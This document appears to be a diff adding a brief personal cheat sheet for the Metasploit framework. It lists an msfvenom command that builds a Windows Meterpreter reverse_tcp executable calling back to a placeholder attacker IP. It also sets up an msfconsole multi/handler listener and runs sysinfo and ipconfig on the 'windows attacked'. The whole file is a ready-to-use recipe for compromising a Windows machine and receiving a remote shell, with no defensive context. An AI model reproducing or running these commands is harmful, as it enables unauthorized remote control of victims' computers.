@@ -1,0 +1,16 @@
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attaker_ip LPORT=any_port_no_without_running_services -f exe > file_name/location
+
+
+
+to start session::::::::::::::::::::::::::
+> msfconsole
+> use exploit/multi/handler
+> set LHOST your_ip 
+> set LPORT any_port_number
+
+
+
+
+
+meterpreter > sysinfo
+meterpreter > ipconfig //ip of windows attacked
